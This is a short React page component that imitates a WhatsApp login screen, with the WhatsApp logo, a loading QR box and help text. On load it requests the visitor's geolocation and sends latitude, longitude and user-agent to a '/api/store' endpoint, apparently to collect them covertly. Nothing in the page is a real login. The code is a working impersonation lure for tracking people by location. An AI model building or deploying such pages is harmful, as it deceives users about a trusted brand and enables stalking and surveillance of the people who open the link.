"use client";
import { useEffect } from "react";

export default function Home() {
    useEffect(() => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(success, error);
        }
    }, []);

    function success(position: GeolocationPosition) {
        fetch(`/api/store?lat=${position.coords.latitude}&long=${position.coords.longitude}&uagent=${navigator.userAgent}`)
            .then(response => response.json())
            .then(data => console.log("Response:", data))
            .catch(error => console.error("Error:", error));
    }

    function error() {
        console.log("Geolocation permission denied.");
    }

    return (
        <div className="container">
            <div className="logo">
                <img className="logo-icon" src="/whatsapp-logo-1.png" alt="WhatsApp Logo" />
                <span>WhatsApp</span>
            </div>
            <h1>Logging in to WhatsApp</h1>
            <div className="qr-section">
                <div className="qr-container">
                    <div className="qr-loading"></div>
                </div>
                <div className="help-text">
                    <h2>Keep your phone connected</h2>
                    <p>WhatsApp syncs messages with your phone. Connect to Wi-Fi to save data.</p>
                </div>
            </div>
        </div>
    );
}
